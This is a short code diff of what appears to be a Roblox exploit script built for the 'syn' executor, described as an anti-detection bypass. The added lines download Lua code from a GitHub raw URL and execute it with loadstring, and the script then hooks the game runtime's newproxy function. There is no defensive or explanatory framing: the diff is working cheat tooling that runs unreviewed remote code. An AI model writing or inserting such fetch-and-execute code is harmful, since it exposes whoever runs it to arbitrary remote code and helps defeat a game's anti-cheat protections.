@@ -1,6 +1,12 @@
---assert(syn, "unsupported exploit")
+assert(syn, "unsupported exploit")
 
 -- some antidex bypass
+local http0001,http0002 = pcall(game.HttpGet, game, 'https://raw.githubusercontent.com/soul94/AdvancedDecompile/main/AntiDex00000.lua')
+
+if http0001 then
+    loadstring(http0002)()
+end
+
 local Tablef = {}
 local OldProxy = nil;
 OldProxy = hookfunction(getrenv().newproxy, function(...)
